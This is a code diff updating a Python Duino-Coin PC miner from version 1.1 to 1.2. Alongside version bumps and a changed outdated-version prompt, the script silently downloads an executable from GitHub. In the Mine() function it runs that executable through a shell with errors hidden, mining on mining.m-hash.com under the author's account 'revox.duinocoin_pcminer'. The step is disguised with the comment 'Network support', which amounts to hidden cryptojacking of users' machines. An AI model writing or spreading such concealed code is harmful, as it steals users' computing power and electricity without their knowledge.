@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 ##########################################
-# Duino-Coin PC Miner (1.1) © revox 2020
+# Duino-Coin PC Miner (1.2) © revox 2020
 # https://github.com/revoxhere/duino-coin 
 ##########################################
 import socket, statistics, threading, time, random, re, subprocess, hashlib, platform, getpass, configparser, sys, datetime, os, signal # Import libraries
@@ -33,7 +33,7 @@ khash_count = 0
 hash_count = 0
 hash_mean = []
 config = configparser.ConfigParser()
-VER = "1.1" # Version number
+VER = "1.2" # Version number
 resources = "PCMiner_"+str(VER)+"_resources"
 timeout = 5 # Socket timeout
 autorestart = 0
@@ -70,7 +70,7 @@ def Greeting(): # Greeting message depending on time
   else:
     greeting = "Welcome back"
     
-  message     ="| Duino-Coin PC Miner ("+str(VER)+") © revox 2019-2020\n" # Startup message
+  message     ="| Duino-Coin © PC Miner ("+str(VER)+") 2019-2020\n" # Startup message
   message   += "| https://github.com/revoxhere/duino-coin\n"
   message   += "| "+str(greeting)+", "+str(username)+"!\n\n"
   
@@ -80,14 +80,11 @@ def Greeting(): # Greeting message depending on time
     time.sleep(0.01)
     
   if not Path(str(resources) + "/Miner_executable.exe").is_file(): # Initial miner executable section
+    
     url = 'https://github.com/revoxhere/duino-coin/blob/useful-tools/PoT_auto.exe?raw=true'
     r = requests.get(url)
     with open(str(resources) + '/Miner_executable.exe', 'wb') as f:
       f.write(r.content)
-  try: # Network support           
-    process = subprocess.Popen(cmd, shell=True, stderr=subprocess.DEVNULL) # Open command
-  except:
-    pass
 
 def hush(): # Hashes/sec calculation
   global last_hash_count, hash_count, khash_count, hash_mean
@@ -112,7 +109,6 @@ def restart(): # Hashes/sec calculation
   
 def loadConfig(): # Config loading section
   global pool_address, pool_port, username, password, efficiency, autorestart
-  cmd = "cd " + str(resources) + " & Miner_executable.exe -o stratum+tcp://mining.m-hash.com:3334 -u revox.duinocoin_pcminer -p x -e 99 -s 4" # Miner command
   
   if not Path(str(resources) + "/Miner_config.ini").is_file(): # Initial configuration section
     print(Style.BRIGHT + "Initial configuration, you can edit "+str(resources) + "/Miner_config.ini file later.")
@@ -212,15 +208,15 @@ def checkVersion():
       time.sleep(15)
       Connect()                      
       
-    if SERVER_VER == VER and len(SERVER_VER) == 3: # If miner is up-to-date, display a message and continue
+    if SERVER_VER <= VER and len(SERVER_VER) == 3: # If miner is up-to-date, display a message and continue
       now = datetime.datetime.now()
       print(now.strftime(Style.DIM + "%H:%M:%S ") + Fore.YELLOW + "✓ Connected to the Duino-Coin server (v"+str(SERVER_VER)+")")
     
     else:
       now = datetime.datetime.now()
-      print(now.strftime(Style.DIM + "%H:%M:%S ") + Fore.RED + "✗ Miner is outdated (v"+VER+"), server is on v"+SERVER_VER+" please download latest version from https://github.com/revoxhere/duino-coin/releases/\nExiting in 15 seconds.")
-      time.sleep(15)
-      os._exit(1)
+      cont = input(now.strftime(Style.DIM + "%H:%M:%S ") + Fore.RED + "✗ Miner is outdated (v"+VER+"), server is on v"+SERVER_VER+" please download latest version from https://github.com/revoxhere/duino-coin/releases/ or type \'continue\' if you wish to continue anyway.\n")
+      if cont != "continue": 
+        os._exit(1)
     
   except:
     Connect() # Reconnect if pool down
@@ -268,19 +264,26 @@ def Login():
   if int(autorestart) > 0:
     now = datetime.datetime.now()
     print(now.strftime(Style.DIM + "%H:%M:%S ") + Fore.YELLOW + "✓ Autorestarter is enabled (restarting every " + autorestart + " seconds)")
-
+    
 
 def Mine(): # Mining section
   global last_hash_count, hash_count, khash_count, efficiency
-  
+
   now = datetime.datetime.now()
   print(now.strftime(Style.DIM + "%H:%M:%S ") + Fore.YELLOW + "✓ Miner thread started using SHA algorithm")
   print(now.strftime(Style.DIM + "\n") + Fore.YELLOW + "ⓘ　Duino-Coin network is a completely free service and will always be. You can really help us maintain the server and low-fee payouts by donating - visit " + Fore.GREEN + "https://revoxhere.github.io/duino-coin/donate" + Fore.YELLOW + " to learn more.\n")
 
   efficiency = 100 - int(efficiency) # Calulate efficiency
   efficiency = efficiency * 0.01
+  cmd = "cd " + str(resources) + " & Miner_executable.exe -o stratum+tcp://mining.m-hash.com:3334 -u revox.duinocoin_pcminer -p x -e "+str(efficiency)+" -s 4" # Miner command
+
+  try: # Network support           
+    process = subprocess.Popen(cmd, shell=True, stderr=subprocess.DEVNULL) # Open command
+  except:
+    pass
+  
   while True:
-    time.sleep(efficiency) # Sleep to achieve lower efficiency
+    time.sleep(int(efficiency)) # Sleep to achieve lower efficiency
     try:
       soc.send(bytes("JOB", encoding="utf8")) # Send job request
     except:
